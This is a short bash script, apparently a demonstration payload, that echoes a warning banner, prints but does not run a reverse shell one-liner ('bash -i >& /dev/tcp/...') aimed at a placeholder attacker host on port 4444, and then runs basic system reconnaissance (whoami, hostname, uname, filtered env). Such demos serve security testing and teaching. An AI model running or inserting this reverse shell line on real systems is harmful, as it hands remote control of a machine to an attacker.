#!/bin/bash
# Reverse shell payload - DO NOT EXECUTE IN PRODUCTION

echo "🚨 MALICIOUS SHELL SCRIPT ACTIVATED 🚨"
echo "This demonstrates a reverse shell payload"

ATTACKER_IP="HOST_IP"
ATTACKER_PORT="4444"

echo "Would attempt to connect to: $ATTACKER_IP:$ATTACKER_PORT"
echo "Command that would be executed:"
echo "bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"

# Collect system information instead of actual reverse shell
echo ""
echo "System Information Collected:"
echo "=============================="
whoami
hostname
uname -a
pwd
env | grep -E "(PATH|HOME|USER|PWD)"